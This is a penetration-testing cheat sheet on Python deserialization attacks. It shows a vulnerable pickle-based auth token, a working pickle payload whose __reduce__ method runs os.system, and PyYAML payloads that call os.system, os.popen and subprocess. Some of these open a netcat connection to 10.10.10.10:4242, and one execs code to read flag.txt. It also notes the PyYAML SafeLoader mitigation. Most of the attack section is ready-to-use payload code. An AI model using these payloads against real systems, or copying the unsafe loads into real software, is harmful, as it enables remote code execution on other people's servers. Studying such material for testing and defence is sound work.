# python deserialization

> python deserialization is the process of reconstructing python objects from serialized data, commonly done using formats like json, pickle, or yaml. the pickle module is a frequently used tool for this in python, as it can serialize and deserialize complex python objects, including custom classes.

## summary

* [tools](#tools)
* [methodology](#methodology)
    * [pickle](#pickle)
    * [pyyaml](#pyyaml)
* [references](#references)


## tools

* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - serialized payload for deserialization rce attack on python driven applications where pickle,pyyaml, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.


## methodology

in python source code, look for these sinks:

* `cpickle.loads`
* `pickle.loads`
* `_pickle.loads`
* `jsonpickle.decode`


### pickle

the following code is a simple example of using `cpickle` in order to generate an auth_token which is a serialized user object.
:warning: `import cpickle` will only work on python 2

```python
import cpickle
from base64 import b64encode, b64decode

class user:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = user()
auth_token = b64encode(cpickle.dumps(h))
print("your auth token : {}").format(auth_token)
```

the vulnerability is introduced when a token is loaded from an user input. 

```python
new_token = raw_input("new auth token : ")
token = cpickle.loads(b64decode(new_token))
print "welcome {}".format(token.username)
```

python 2.7 documentation clearly states pickle should never be used with untrusted sources. let's create a malicious data that will execute arbitrary code on the server.

> the pickle module is not secure against erroneous or maliciously constructed data. never unpickle data received from an untrusted or unauthenticated source.

```python
import cpickle, os
from base64 import b64encode, b64decode

class evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = evil()
evil_token = b64encode(cpickle.dumps(e))
print("your evil token : {}").format(evil_token)
```


### pyyaml

yaml deserialization is the process of converting yaml-formatted data back into objects in programming languages like python, ruby, or java. yaml (yaml ain't markup language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:warning
  state:
    update: !!python/name:exec
```

since pyyaml version 6.0, the default loader for `load` has been switched to safeloader mitigating the risks against remote code execution. [pr #420 - fix](https://github.com/yaml/pyyaml/issues/420)

the vulnerable sinks are now `yaml.unsafe_load` and `yaml.load(input, loader=yaml.unsafeloader)`.

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,loader=yaml.unsafeloader)
```


## references

- [cve-2019-20477 - 0day yaml deserialization attack on pyyaml version <= 5.1.2 - manmeet singh (@_j0lt) - june 21, 2020](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
- [exploiting misuse of python's "pickle" - nelson elhage - march 20, 2011](https://blog.nelhage.com/2011/03/exploiting-pickle/)
- [python yaml deserialization - hacktricks - july 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
- [pyyaml documentation - pyyaml - april 29, 2006](https://pyyaml.org/wiki/pyyamldocumentation)
- [yaml deserialization attack in python - manmeet singh & ashish kukret - november 13, 2021](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)